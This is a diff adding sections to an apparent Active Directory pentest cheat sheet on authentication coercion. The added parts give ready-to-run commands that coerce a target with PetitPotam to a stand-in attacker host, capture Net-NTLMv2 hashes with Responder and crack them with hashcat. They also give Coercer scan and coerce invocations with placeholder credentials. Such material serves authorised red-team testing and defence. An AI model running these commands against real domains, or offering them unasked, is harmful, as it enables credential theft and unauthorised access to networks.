@@ -33,6 +33,17 @@ python3 PetitPotam.py -d DOMAIN -u lowpriv -p 'Password123!' ATTACKER_IP TARGET_
 
 **Reference:** [github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam) · [thehacker.recipes — MS-EFSR abuse](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr)
 
+### PetitPotam for Hash Capture (standalone, no relay)
+When relay is not viable (SMB signing enforced everywhere), use coercion to capture Net-NTLMv2 hashes for offline cracking with Responder instead:
+```bash
+# Terminal 1: start Responder
+responder -I eth0
+
+# Terminal 2: coerce the target to authenticate
+python3 PetitPotam.py <ATTACKER_IP> <TARGET_IP>
+```
+Responder captures the Net-NTLMv2 hash. Crack with `hashcat -m 5600`. Machine account hashes ($MACHINE@DOMAIN) are typically random and uncrackable, but user-context coercion (e.g., a service running as a domain user) yields crackable hashes.
+
 ---
 
 ## PrinterBug (MS-RPRN)
@@ -94,6 +105,18 @@ python3 dfscoerce.py -d DOMAIN -u lowpriv -p 'Password123!' ATTACKER_IP TARGET_D
 **Note — unified framework:** [p0dalirius/Coercer](https://github.com/p0dalirius/Coercer) automates ~12 coercion methods (including PetitPotam, PrinterBug, ShadowCoerce, DFSCoerce variants) behind one CLI: `python3 Coercer.py coerce -u lowpriv -p 'Password123!' -d DOMAIN -l ATTACKER_IP -t TARGET_IP`.
 
 **Faster (nxc):** `nxc smb <target> -u lowpriv -p Password123! -d DOMAIN -M coerce_plus -o LISTENER=<attacker_ip>` checks all major coercion methods (PetitPotam/DFSCoerce/PrinterBug/ShadowCoerce/MSEven) against a target in one command.
+
+---
+
+### Coercer — Unified Coercion Scanner
+[Coercer](https://github.com/p0dalirius/Coercer) wraps 12+ coercion methods (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, and more) into a single tool, testing which ones work against a target in one pass.
+```bash
+# Scan mode — check what's coercible without triggering (safe for enumeration)
+coercer scan -t <TARGET_IP> -u user -p pass -d domain.local
+
+# Coerce mode — trigger authentication to your listener
+coercer coerce -t <TARGET_IP> -l <ATTACKER_IP> -u user -p pass -d domain.local
+```
 
 ---
 
